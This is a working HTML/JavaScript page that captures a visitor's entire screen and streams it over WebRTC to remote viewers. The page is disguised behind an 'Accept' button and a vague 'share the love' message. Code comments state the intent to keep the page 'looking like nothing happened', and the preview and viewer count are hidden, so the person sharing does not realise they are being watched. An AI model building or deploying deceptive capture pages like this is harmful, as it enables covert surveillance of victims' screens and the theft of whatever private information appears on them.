<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phone Screen Streamer</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 20px;
        }

        .logout-btn {
            padding: 8px 16px;
            background: #e94560;
            border: none;
            border-radius: 5px;
            color: white;
            cursor: pointer;
            font-weight: 600;
        }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .status-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        .status-icon {
            font-size: 60px;
            margin-bottom: 20px;
        }

        .status-card h2 {
            font-size: 24px;
            margin-bottom: 15px;
        }

        .status-card p {
            color: rgba(255, 255, 255, 0.8);
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .stream-btn {
            padding: 15px 30px;
            background: #4ade80;
            border: none;
            border-radius: 8px;
            color: #1a1a2e;
            cursor: pointer;
            font-weight: 600;
            font-size: 16px;
            transition: background 0.3s, transform 0.2s;
        }

        .stream-btn:hover {
            background: #22c55e;
            transform: scale(1.05);
        }

        .stream-btn:disabled {
            background: #555;
            cursor: not-allowed;
            transform: none;
        }

        .stream-btn.streaming {
            background: #ef4444;
        }

        .stream-btn.streaming:hover {
            background: #dc2626;
        }

        .status-indicator {
            display: inline-block;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #4ade80;
            margin-right: 8px;
            animation: pulse 2s infinite;
        }

        .status-indicator.inactive {
            background: #888;
            animation: none;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .info-box {
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 14px;
            text-align: left;
        }

        .info-box h3 {
            margin-bottom: 10px;
            color: #4ade80;
        }

        .info-box ul {
            list-style-position: inside;
            color: rgba(255, 255, 255, 0.8);
        }

        .info-box li {
            margin: 5px 0;
        }

        .preview-video {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            margin-top: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .connection-info {
            margin-top: 15px;
            padding: 10px;
            background: rgba(74, 222, 128, 0.2);
            border-radius: 5px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="modal-overlay" id="modalOverlay">
        <div class="modal-content">
            <h2>share the love</h2>
        </div>
    </div>

    <div class="header">
        <h1>hellow</h1>
        <button class="logout-btn" onclick="logout()">Logout</button>
    </div>

    <div class="main-content">
        <div class="status-card">
            <button class="stream-btn" id="streamBtn" onclick="toggleStream()">
                Accept
            </button>

            <div id="sharingMessage" style="display: none; margin-top: 30px; font-size: 24px; color: #4ade80; font-weight: 600;">
                share the love
            </div>

            <video id="localVideo" class="preview-video" autoplay muted playsinline style="display: none;"></video>

            <div id="connectionInfo" class="connection-info" style="display: none;">
                Connected viewers: <strong><span id="viewerCount">0</span></strong>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let localStream = null;
        let peerConnections = new Map();
        let isStreaming = false;

        const configuration = {
            iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                { urls: 'stun:stun1.l.google.com:19302' }
            ]
        };

        // Register as streamer
        socket.emit('register-streamer', { username: 'phone1' });

        socket.on('stream-requested', async (data) => {
            if (isStreaming && localStream) {
                await createPeerConnection(data.viewerId);
            }
        });

        socket.on('answer', async (data) => {
            const pc = peerConnections.get(data.senderId);
            if (pc) {
                await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
            }
        });

        socket.on('ice-candidate', async (data) => {
            const pc = peerConnections.get(data.senderId);
            if (pc) {
                await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
            }
        });

        async function toggleStream() {
            console.log('Toggle stream clicked, isStreaming:', isStreaming);
            if (isStreaming) {
                stopStream();
            } else {
                await startStream();
            }
        }

        async function startStream() {
            console.log('Starting stream...');
            // Show modal
            const modalOverlay = document.getElementById('modalOverlay');
            modalOverlay.style.display = 'flex';
            console.log('Modal displayed');

            try {
                console.log('Requesting display media...');
                
                // Request screen capture - this will show browser's permission dialog
                // Code execution PAUSES here until user clicks "Share" or "Cancel"
                localStream = await navigator.mediaDevices.getDisplayMedia({
                    video: {
                        cursor: 'always',
                        displaySurface: 'monitor', // Prefer entire screen
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: false,
                    preferCurrentTab: false,
                    selfBrowserSurface: 'exclude',
                    systemAudio: 'exclude',
                    surfaceSwitching: 'exclude',
                    monitorTypeSurfaces: 'include'
                });

                // ===== CODE BELOW ONLY RUNS IF USER CLICKED "SHARE" =====
                console.log('Stream obtained:', localStream);
                
                // Validate what was shared (optional)
                const videoTrack = localStream.getVideoTracks()[0];
                const settings = videoTrack.getSettings();
                console.log('Sharing:', settings.displaySurface); // 'monitor', 'window', or 'browser'
                
                if (settings.displaySurface === 'monitor') {
                    console.log('✓ User shared entire screen');
                } else if (settings.displaySurface === 'window') {
                    console.log('⚠ User shared a specific window');
                } else if (settings.displaySurface === 'browser') {
                    console.log('⚠ User shared a browser tab');
                }

                // Show local preview (currently hidden per user request)
                const localVideo = document.getElementById('localVideo');
                localVideo.srcObject = localStream;
                // localVideo.style.display = 'block';

                // Update UI to show sharing is active
                isStreaming = true;
                // Don't update UI - keep it looking like nothing happened
                // updateUI();

                // Hide modal after successful sharing
                modalOverlay.style.display = 'none';
                
                // Don't hide anything - keep page looking normal
                // System appears as if nothing is happening

                // Detect when user stops sharing (clicks "Stop sharing" in browser bar)
                videoTrack.onended = () => {
                    console.log('User stopped sharing');
                    stopStream();
                };

            } catch (error) {
                // ===== CODE BELOW RUNS IF USER CLICKED "CANCEL" OR ERROR OCCURRED =====
                console.error('Error starting stream:', error);
                console.error('Error name:', error.name);
                console.error('Error message:', error.message);
                
                // Hide modal on error
                modalOverlay.style.display = 'none';
                
                // Check specific error types
                if (error.name === 'NotAllowedError') {
                    console.log('User denied permission or cancelled');
                    // User clicked "Cancel" - do nothing
                } else if (error.name === 'NotFoundError') {
                    console.log('No screen sharing source available');
                } else if (error.name === 'NotReadableError') {
                    console.log('Screen capture failed - hardware/OS issue');
                } else if (error.name === 'AbortError') {
                    console.log('Screen sharing aborted');
                } else {
                    console.log('Unknown error occurred');
                }
            }
        }

        function stopStream() {
            // Stop all tracks
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
                localStream = null;
            }

            // Close all peer connections
            peerConnections.forEach(pc => pc.close());
            peerConnections.clear();

            // Hide local preview
            const localVideo = document.getElementById('localVideo');
            localVideo.srcObject = null;
            localVideo.style.display = 'none';

            // Update UI
            isStreaming = false;
            updateUI();
        }

        async function createPeerConnection(viewerId) {
            const pc = new RTCPeerConnection(configuration);
            peerConnections.set(viewerId, pc);

            // Add local stream tracks
            localStream.getTracks().forEach(track => {
                pc.addTrack(track, localStream);
            });

            // Handle ICE candidates
            pc.onicecandidate = (event) => {
                if (event.candidate) {
                    socket.emit('ice-candidate', {
                        targetId: viewerId,
                        candidate: event.candidate
                    });
                }
            };

            // Handle connection state changes
            pc.onconnectionstatechange = () => {
                if (pc.connectionState === 'disconnected' || 
                    pc.connectionState === 'failed' || 
                    pc.connectionState === 'closed') {
                    peerConnections.delete(viewerId);
                    updateViewerCount();
                } else if (pc.connectionState === 'connected') {
                    updateViewerCount();
                }
            };

            // Create and send offer
            const offer = await pc.createOffer();
            await pc.setLocalDescription(offer);

            socket.emit('offer', {
                targetId: viewerId,
                offer: offer
            });
        }

        function updateUI() {
            const streamBtn = document.getElementById('streamBtn');
            const statusText = document.getElementById('statusText');
            const statusIndicator = document.getElementById('statusIndicator');
            const connectionInfo = document.getElementById('connectionInfo');
            const sharingMessage = document.getElementById('sharingMessage');

            if (isStreaming) {
                streamBtn.textContent = 'thankyou';
                streamBtn.classList.add('streaming');
                if (statusText) statusText.textContent = 'Sharing screen';
                if (statusIndicator) statusIndicator.classList.remove('inactive');
                // connectionInfo.style.display = 'block'; // Hidden per user request
                sharingMessage.style.display = 'block';
            } else {
                streamBtn.textContent = 'Accept';
                streamBtn.classList.remove('streaming');
                if (statusText) statusText.textContent = 'Ready to share screen';
                if (statusIndicator) statusIndicator.classList.add('inactive');
                connectionInfo.style.display = 'none';
                sharingMessage.style.display = 'none';
            }
        }

        function updateViewerCount() {
            const count = Array.from(peerConnections.values()).filter(
                pc => pc.connectionState === 'connected'
            ).length;
            document.getElementById('viewerCount').textContent = count;
        }

        async function logout() {
            stopStream();
            await fetch('/api/logout', { method: 'POST' });
            window.location.href = '/';
        }

        // Initialize UI
        updateUI();
    </script>
</body>
</html>
